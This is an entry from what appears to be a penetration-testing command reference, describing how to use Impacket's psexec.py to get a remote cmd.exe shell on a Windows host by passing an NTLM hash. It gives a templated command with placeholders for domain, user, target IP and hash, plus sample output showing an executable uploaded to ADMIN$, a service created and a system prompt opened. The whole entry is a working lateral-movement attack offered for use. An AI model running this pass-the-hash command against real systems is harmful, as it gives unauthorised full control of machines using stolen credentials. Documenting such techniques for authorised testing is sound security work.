---
id: e84cd421-4230-4a91-a661-bc4137315d38
name: psexec.py Spawn a cmd.exe shell on a Remote System (NTLM)
type: command
executor: ''
data: psexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
output: 'root@kali:~# psexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce3573570775af

  Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation


  INFO:root:Trying protocol 445/SMB...


  INFO:impacket:Requesting shares on 10.10.10.10.....

  INFO:impacket:Found writable share ADMIN$

  INFO:impacket:Uploading file jlPMeOew.exe

  INFO:impacket:Opening SVCManager on 10.10.10.10.....

  INFO:impacket:Creating service guFG on 10.10.10.10.....

  INFO:impacket:Starting service guFG.....

  [!] Press help for extra shell commands

  Microsoft Windows [Version 10.0.18362.295]

  (c) 2019 Microsoft Corporation. All rights reserved.


  C:\Windows\system32>'
created_at: '2019-10-01T17:58:48.947864+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Impacket]]'
---

# psexec.py Spawn a cmd.exe shell on a Remote System (NTLM)

```bash
psexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```

## Expected Output

```
root@kali:~# psexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce3573570775af
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:Trying protocol 445/SMB...

INFO:impacket:Requesting shares on 10.10.10.10.....
INFO:impacket:Found writable share ADMIN$
INFO:impacket:Uploading file jlPMeOew.exe
INFO:impacket:Opening SVCManager on 10.10.10.10.....
INFO:impacket:Creating service guFG on 10.10.10.10.....
INFO:impacket:Starting service guFG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.18362.295]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


